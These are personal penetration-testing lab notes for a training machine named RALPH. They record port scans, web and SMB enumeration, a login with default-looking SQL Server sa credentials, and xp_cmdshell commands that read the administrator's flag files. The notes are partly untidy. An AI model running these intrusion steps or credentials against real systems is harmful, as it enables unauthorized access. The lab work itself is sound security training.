###  Machine Information

```shell
IP ADDRESS: 10.11.1.31
HN: RALPH
OS: Windows Server 2016 Standard 14393 x64
EXPLOIT/PORT: impacket-mssqlclient sa:poiuytrewq@10.11.1.31
PRIVESC: impacket gave system
USERS MENTIONED: Ralph
CREDENTIALS: sa:poiuytrewq
```

### 1. Nmap:  

#nmapfulltcp
```shell
┌──(root㉿kali)-[/home/kali/Documents/offsec_labs_pen200]
└─# nmap -sC -sV -p- -Pn 10.11.1.31
Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-22 14:36 EDT
Nmap scan report for 10.11.1.31
Host is up (0.062s latency).
Not shown: 65526 filtered tcp ports (no-response)
PORT      STATE SERVICE       VERSION
80/tcp    open  http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Login
| http-cookie-flags: 
|   /: 
|     ASPSESSIONIDCQRBQQDB: 
|_      httponly flag not set
| http-methods: 
|_  Potentially risky methods: TRACE
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds  Windows Server 2016 Standard 14393 microsoft-ds
1433/tcp  open  ms-sql-s      Microsoft SQL Server 2017 14.00.1000.00; RTM
|_ssl-date: 2023-03-22T18:42:35+00:00; -1s from scanner time.
|_ms-sql-ntlm-info: ERROR: Script execution failed (use -d to debug)
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2021-12-24T00:39:02
|_Not valid after:  2051-12-24T00:39:02
|_ms-sql-info: ERROR: Script execution failed (use -d to debug)
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
| ssl-cert: Subject: commonName=ralph
| Not valid before: 2023-03-20T09:48:01
|_Not valid after:  2023-09-19T09:48:01
|_ssl-date: 2023-03-22T18:42:35+00:00; -1s from scanner time.
| rdp-ntlm-info: 
|   Target_Name: RALPH
|   NetBIOS_Domain_Name: RALPH
|   NetBIOS_Computer_Name: RALPH
|   DNS_Domain_Name: ralph
|   DNS_Computer_Name: ralph
|   Product_Version: 10.0.14393
|_  System_Time: 2023-03-22T18:41:55+00:00
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Host script results:
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-time: 
|   date: 2023-03-22T18:41:58
|_  start_date: 2021-12-24T00:38:53
| smb2-security-mode: 
|   311: 
|_    Message signing enabled but not required
| smb-os-discovery: 
|   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)
|   Computer name: ralph
|   NetBIOS computer name: RALPH\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2023-03-22T18:41:56+00:00

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 357.08 seconds


```

#nmapudp
```shell
N/A
```

### 3. Web Fuzzing : Dirsearch & GoBuster
#webfuzzing 
```shell
#gobuster syntax
┌──(root㉿kali)-[/home/kali]
└─# gobuster dir -u http://10.11.1.31 -w /usr/share/dirb/wordlists/common.txt -x php,txt,html,asp,aspx
===============================================================
Gobuster v3.4
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.11.1.31
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/dirb/wordlists/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.4
[+] Extensions:              php,txt,html,asp,aspx
[+] Timeout:                 10s
===============================================================
2023/03/22 14:59:34 Starting gobuster in directory enumeration mode
===============================================================
/_private             (Status: 301) [Size: 150] [--> http://10.11.1.31/_private/]
/_vti_cnf             (Status: 301) [Size: 150] [--> http://10.11.1.31/_vti_cnf/]
/_vti_inf.html        (Status: 200) [Size: 1754]
/_vti_log             (Status: 301) [Size: 150] [--> http://10.11.1.31/_vti_log/]
/_vti_pvt             (Status: 301) [Size: 150] [--> http://10.11.1.31/_vti_pvt/]
/_vti_script          (Status: 301) [Size: 153] [--> http://10.11.1.31/_vti_script/]
/_vti_txt             (Status: 301) [Size: 150] [--> http://10.11.1.31/_vti_txt/]
/aspnet_client        (Status: 301) [Size: 155] [--> http://10.11.1.31/aspnet_client/]
/images               (Status: 301) [Size: 148] [--> http://10.11.1.31/images/]
/Images               (Status: 301) [Size: 148] [--> http://10.11.1.31/Images/]
/postinfo.html        (Status: 200) [Size: 2439]
Progress: 27670 / 27690 (99.93%)


#dirsearch syntax
┌──(root㉿kali)-[/home/kali]
└─# dirsearch -e php,html,js,asp,aspx -u http://10.11.1.31:80 -x 400,401,403 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt

  _|. _ _  _  _  _ _|_    v0.4.2
 (_||| _) (/_(_|| (_| )

Extensions: php, html, js, asp, aspx | HTTP method: GET | Threads: 30 | Wordlist size: 220545

Output File: /root/.dirsearch/reports/10.11.1.31-80/_23-03-22_15-03-26.txt

Error Log: /root/.dirsearch/logs/errors-23-03-22_15-03-26.log

Target: http://10.11.1.31:80/

[15:03:26] Starting: 
[15:03:27] 301 -  148B  - /images  ->  http://10.11.1.31/images/
[15:03:27] 301 -  148B  - /Images  ->  http://10.11.1.31/Images/
[15:03:36] 301 -  148B  - /IMAGES  ->  http://10.11.1.31/IMAGES/
[15:07:14] 301 -  150B  - /_private  ->  http://10.11.1.31/_private/

```

```shell
┌──(root㉿kali)-[/home/kali]
└─# dirsearch -e php,html,js,asp,aspx -u http://10.11.1.31:80 -x 400,401,403 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt

  _|. _ _  _  _  _ _|_    v0.4.2
 (_||| _) (/_(_|| (_| )

Extensions: php, html, js, asp, aspx | HTTP method: GET | Threads: 30 | Wordlist size: 220545

Output File: /root/.dirsearch/reports/10.11.1.31-80/_23-03-22_15-03-26.txt

Error Log: /root/.dirsearch/logs/errors-23-03-22_15-03-26.log

Target: http://10.11.1.31:80/

[15:03:26] Starting: 
[15:03:27] 301 -  148B  - /images  ->  http://10.11.1.31/images/
[15:03:27] 301 -  148B  - /Images  ->  http://10.11.1.31/Images/
[15:03:36] 301 -  148B  - /IMAGES  ->  http://10.11.1.31/IMAGES/
[15:07:14] 301 -  150B  - /_private  ->  http://10.11.1.31/_private/
```

### 4. SMB
#smb445
```shell
#crackmapexec guest login - grabs domain names and version information
root㉿kali)-[/home/kali/Documents/offsec_labs_pen200]
crackmapexec smb 10.11.1.31 -u 'guest' -p '' --sessions
SMB         10.11.1.31      445    RALPH            [*] Windows Server 2016 Standard 14393 x64 (name:RALPH) (domain:ralph) (signing:False) (SMBv1:True)
SMB         10.11.1.31      445    RALPH            [+] ralph\guest: 
SMB         10.11.1.31      445    RALPH            [+] Enumerated sessions



#crackmapexec anonymous login
crackmapexec smb 10.11.1.31 -u '' -p '' --sessions 
SMB         10.11.1.31      445    RALPH            [*] Windows Server 2016 Standard 14393 x64 (name:RALPH) (domain:ralph) (signing:False) (SMBv1:True)
SMB         10.11.1.31      445    RALPH            [-] ralph\: STATUS_ACCESS_DENIED 

#smbclient anonymous
#smbclient -L \\\\10.11.1.31 -N 

	Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	C$              Disk      Default share
	IPC$            IPC       Remote IPC
	wwwroot         Disk      
	
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.11.1.31 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available

# able to login to smb with guest - able to write to 
# only have access to the wwroot - see its has .asp, going to try reverse shell
┌──(root㉿kali)-[/home/kali/Documents/offsec_labs_pen200]
└─# smbclient \\\\10.11.1.31\\wwwroot -U guest
Password for [WORKGROUP\guest]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Sat Nov  2 13:19:55 2019
  ..                                  D        0  Sat Nov  2 13:19:55 2019
  aspnet_client                       D        0  Sat Nov  2 12:37:44 2019
  base-login.asp                      A     1292  Fri Nov  1 09:18:45 2019
  base-login.txt                      A     1292  Fri Nov  1 09:18:45 2019
  iisstart.htm                        A     1433  Fri Nov  1 09:18:45 2019
  iisstart.png                        A    99710  Sat Nov  2 12:33:13 2019
  images                              D        0  Mon Feb 18 10:23:08 2008
  login-off.asp                       A     1369  Fri Nov  1 09:18:45 2019
  login-off.asp.txt                   A     1369  Fri Nov  1 09:18:45 2019
  pagerror.gif                        A     2806  Fri Nov  1 09:18:45 2019
  postinfo.html                       A     2439  Fri Nov  1 09:18:45 2019
  restricted.htm                      A      121  Fri Nov  1 09:18:45 2019
  web.config                          A      454  Sat Nov  2 16:12:58 2019
  _private                            D        0  Mon Feb 18 10:23:08 2008
  _vti_cnf                            D        0  Sat Nov  2 13:19:04 2019
  _vti_inf.html                       A     1754  Fri Nov  1 09:18:45 2019
  _vti_log                            D        0  Mon Feb 18 10:23:08 2008
  _vti_pingit                         D        0  Sat Nov  2 13:19:04 2019
  _vti_pvt                            D        0  Sat Nov  2 13:19:04 2019
  _vti_script                         D        0  Mon Feb 18 10:23:08 2008
  _vti_txt                            D        0  Mon Feb 18 10:23:08 2008

		9029631 blocks of size 4096. 2536379 blocks available
smb: \> 

#wpscan #bruteforce #admin/princess #credentials

```shell
```


### 8. Flag

```powershell
SQL> xp_cmdshell type C:\users\administrator\Desktop\proof.txt
output                                                                             

--------------------------------------------------------------------------------   

dec04ea1c0d39acd7a53c543540b0a3a                                                   

SQL> xp_cmdshell type C:\users\administrator\Desktop\network-secret.txt
output                                                                             

--------------------------------------------------------------------------------   

7eab8563146f16140c769072580cbcb3 
```




# Post Flag Notes

```shell
#reference the chickenscratch for rest of opnotes
```








